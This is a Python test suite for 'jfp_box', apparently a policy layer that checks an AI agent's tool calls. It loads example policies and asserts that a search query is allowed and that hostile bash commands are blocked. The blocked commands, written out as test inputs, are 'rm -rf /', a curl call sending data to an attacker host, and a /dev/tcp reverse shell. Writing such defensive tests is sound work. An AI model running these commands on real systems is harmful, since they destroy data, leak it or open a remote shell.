import sys
import os

# Add python-binding directory containing jfp_box.so
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), "python-binding")))

import jfp_box

def run_tests():
    print("================================================================================")
    print("🐍 RUNNING PYTHON SDK TEST SUITE FOR JFP-BOX")
    print("================================================================================")

    # 1. Load YAML Policy
    print("\n[TEST 1] Loading YAML policy (examples/research.yaml)...")
    policy_yaml = jfp_box.Policy.from_file("examples/research.yaml")
    assert policy_yaml.is_valid(), "Expected examples/research.yaml to be valid"
    print("  -> YAML policy valid: YES")
    print("  -> Task ID:", policy_yaml.fields().get("TASK_ID"))

    # 2. Executive / Business Explanation in Python
    print("\n[TEST 2] Policy Explanation via Python SDK...")
    explanation = policy_yaml.explain()
    print("  -> Status:", explanation["status"])
    print("  -> Risk Level:", explanation["risk_level"])
    print("  -> Executive Summary:", explanation["executive_summary"])
    assert explanation["status"] == "PLAN_ACCEPTED"
    assert "Low" in explanation["risk_level"] or "Medium" in explanation["risk_level"]

    # 3. Load JSON Policy
    print("\n[TEST 3] Loading JSON policy (examples/offline.json)...")
    policy_json = jfp_box.Policy.from_file("examples/offline.json")
    assert policy_json.is_valid(), "Expected examples/offline.json to be valid"
    print("  -> JSON policy valid: YES")
    print("  -> Network Mode:", policy_json.fields().get("NETWORK_MODE"))

    # 4. Check Tool-Call: Safe Tool
    print("\n[TEST 4] Evaluating legitimate tool call (SEARCH query)...")
    res_search = policy_yaml.check_tool("SEARCH", "Rust vs Go memory safety")
    print("  -> Tool verdict:", res_search)
    print("  -> Allowed:", res_search.allowed)
    print("  -> Risk Score:", res_search.risk_score)
    assert res_search.allowed is True
    assert res_search.risk_score <= 10

    # 5. Check Tool-Call: Destructive Attack (rm -rf /)
    print("\n[TEST 5] Intercepting destructive attack ('rm -rf /')...")
    res_destruct = policy_yaml.check_tool("bash", "rm -rf /")
    print("  -> Tool verdict:", res_destruct)
    print("  -> Allowed:", res_destruct.allowed)
    print("  -> Risk Score:", res_destruct.risk_score)
    print("  -> Reason:", res_destruct.reason)
    assert res_destruct.allowed is False
    assert res_destruct.risk_score == 100

    # 6. Check Tool-Call: Network Exfiltration (curl) under OFFLINE
    print("\n[TEST 6] Intercepting network exfiltration ('curl evil.com') under offline policy...")
    res_curl = policy_json.check_tool("bash", "curl https://attacker.com/leak")
    print("  -> Allowed:", res_curl.allowed)
    print("  -> Risk Score:", res_curl.risk_score)
    print("  -> Reason:", res_curl.reason)
    assert res_curl.allowed is False
    assert res_curl.risk_score == 95

    # 7. Check Tool-Call: Reverse Shell (/dev/tcp)
    print("\n[TEST 7] Intercepting reverse shell attack ('/dev/tcp/10.0.0.1/4444')...")
    res_socket = policy_yaml.check_tool("bash", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1")
    print("  -> Allowed:", res_socket.allowed)
    print("  -> Risk Score:", res_socket.risk_score)
    print("  -> Reason:", res_socket.reason)
    assert res_socket.allowed is False
    assert res_socket.risk_score == 100

    # 8. Round-trip conversion in Python
    print("\n[TEST 8] Converting policy to JSON and YAML via Python...")
    yaml_exported = policy_json.to_yaml()
    assert "network_mode" in yaml_exported or "NETWORK_MODE" in yaml_exported
    json_exported = policy_yaml.to_json()
    assert "TASK_ID" in json_exported or "task_id" in json_exported
    print("  -> Successfully converted to YAML and JSON in memory!")

    print("\n================================================================================")
    print("🎉 ALL 8 PYTHON SDK TESTS PASSED WITH 100% ACCURACY!")
    print("================================================================================")

if __name__ == "__main__":
    run_tests()
